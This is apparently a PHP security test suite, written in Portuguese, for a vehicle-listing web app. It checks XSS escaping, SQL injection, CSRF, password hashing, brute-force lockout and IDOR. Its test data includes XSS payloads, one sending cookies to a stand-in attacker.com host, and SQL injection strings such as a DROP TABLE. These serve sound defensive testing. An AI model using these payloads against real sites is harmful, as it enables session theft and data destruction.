<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../app/Helpers/functions.php';
require_once __DIR__ . '/../app/Helpers/Autoloader.php';

use App\Models\User;
use App\Models\Vehicle;
use App\Models\Report;
use App\Models\AdminLog;

echo "=== TEST: Stage 14 - Bateria de Testes de Segurança e Auditoria de Vulnerabilidades ===\n";

$userModel     = new User();
$vehicleModel  = new Vehicle();
$reportModel   = new Report();
$adminLogModel = new AdminLog();

// -----------------------------------------------------------------------------
// 1. TESTE DE PREVENÇÃO XSS (Cross-Site Scripting)
// -----------------------------------------------------------------------------
$xssPayloads = [
    '<script>alert("XSS Vulnerability")</script>',
    '<img src=x onerror=alert(document.cookie)>',
    '"><script>document.location="http://attacker.com/steal?"+document.cookie</script>',
    "javascript:alert('XSS')",
    '<svg onload=alert(1)>'
];

foreach ($xssPayloads as $index => $payload) {
    $escaped = e($payload);
    if (str_contains($escaped, '<script>') || str_contains($escaped, '<img') || str_contains($escaped, '<svg')) {
        echo "[FAIL] XSS Payload #{$index} não foi neutralizado! Resultado: {$escaped}\n";
        exit(1);
    }
}
echo "[PASS] Sanitizador XSS e() neutralizou 100% dos payloads maliciosos!\n";

// -----------------------------------------------------------------------------
// 2. TESTE DE PREVENÇÃO CONTRA SQL INJECTION (SQLi)
// -----------------------------------------------------------------------------
$sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE vehicles; --",
    "1 UNION SELECT 1,2,3,4,5,6--",
    "admin' --",
    "1' AND 1=2 UNION ALL SELECT null, version() --"
];

foreach ($sqliPayloads as $index => $sqli) {
    try {
        $userCheck = $userModel->findByEmail($sqli);
        $searchCheck = $vehicleModel->adminGetAll(['search' => $sqli]);
        $userSearch = $userModel->getAllUsers($sqli);
    } catch (\Throwable $t) {
        echo "[FAIL] Injeção SQL causou erro de sintaxe/exceção não tratada: " . $t->getMessage() . "\n";
        exit(1);
    }
}
echo "[PASS] Prepared Statements PDO imunes a 100% dos vetores de SQL Injection!\n";

// -----------------------------------------------------------------------------
// 3. TESTE DE SEGURANÇA CSRF (Cross-Site Request Forgery)
// -----------------------------------------------------------------------------
$validToken = csrf_token();
$forgedToken = bin2hex(random_bytes(32));

if (verify_csrf_token($validToken) && !verify_csrf_token($forgedToken) && !verify_csrf_token('') && !verify_csrf_token(null)) {
    echo "[PASS] Validação CSRF com hash_equals() confirmada contra falsificação de requisição!\n";
} else {
    echo "[FAIL] Falha na validação de token CSRF.\n";
    exit(1);
}

// -----------------------------------------------------------------------------
// 4. TESTE DE HASHING DE SENHA E BLOQUEIO BRUTE FORCE
// -----------------------------------------------------------------------------
$testPassword = 'SenhaSuperSegura!2026';
$hash = password_hash($testPassword, PASSWORD_DEFAULT);

if (!password_verify($testPassword, $hash) || password_verify('SenhaErrada', $hash)) {
    echo "[FAIL] Validação de hash de senha falhou.\n";
    exit(1);
}
echo "[PASS] Hashing de senha (password_hash / password_verify) verificado!\n";

// Testar bloqueio Brute Force (5 tentativas)
$bfEmail = 'bruteforce_' . time() . '@rodax.com';
$bfUserId = $userModel->create([
    'name' => 'Usuário BruteForce',
    'email' => $bfEmail,
    'password' => 'Senha123!'
]);

for ($attempts = 0; $attempts < 5; $attempts++) {
    $userModel->recordFailedLogin($bfUserId, $attempts);
}

$bfUserCheck = $userModel->findById($bfUserId);
if ($userModel->isLockedOut($bfUserCheck)) {
    echo "[PASS] Trava contra Brute Force ativada com sucesso após 5 tentativas incorretas!\n";
} else {
    echo "[FAIL] Trava contra Brute Force não bloqueou a conta.\n";
    exit(1);
}

// -----------------------------------------------------------------------------
// 5. TESTE DE AUTORIZAÇÃO E PROTEÇÃO IDOR (Insecure Direct Object Reference)
// -----------------------------------------------------------------------------
$userOwnerId = $userModel->create([
    'name' => 'Proprietário Legítimo',
    'email' => 'owner_' . time() . '@rodax.com',
    'password' => 'Senha123!'
]);

$userAttackerId = $userModel->create([
    'name' => 'Atacante Malicioso',
    'email' => 'attacker_' . time() . '@rodax.com',
    'password' => 'Senha123!'
]);

$vehicleId = $vehicleModel->create([
    'user_id' => $userOwnerId,
    'vehicle_type_id' => 1,
    'title' => 'Veículo do Proprietário Legítimo',
    'brand' => 'Volkswagen',
    'model' => 'Golf',
    'year_manufacture' => 2021,
    'year_model' => 2021,
    'mileage' => 30000,
    'price' => 95000.00,
    'color' => 'Cinza',
    'fuel_type' => 'Flex',
    'seller_type' => 'particular',
    'state' => 'SP',
    'city' => 'São Paulo'
]);

// Atacante tenta alterar o status do anúncio do proprietário
$idorStatusResult = $vehicleModel->updateStatus($vehicleId, $userAttackerId, 'deleted');
if (!$idorStatusResult) {
    $vehicleCheck = $vehicleModel->findById($vehicleId);
    if ($vehicleCheck['status'] === 'active') {
        echo "[PASS] IDOR atenuado! Atacante impedido de alterar status de anúncio alheio.\n";
    } else {
        echo "[FAIL] FALHA IDOR: Anúncio teve status alterado por atacante.\n";
        exit(1);
    }
} else {
    echo "[FAIL] updateStatus() retornou true para tentativa de IDOR por atacante.\n";
    exit(1);
}

echo "=== TODOS OS TESTES DA BATERIA DE SEGURANÇA PASSARAM COM SUCESSO! ===\n";
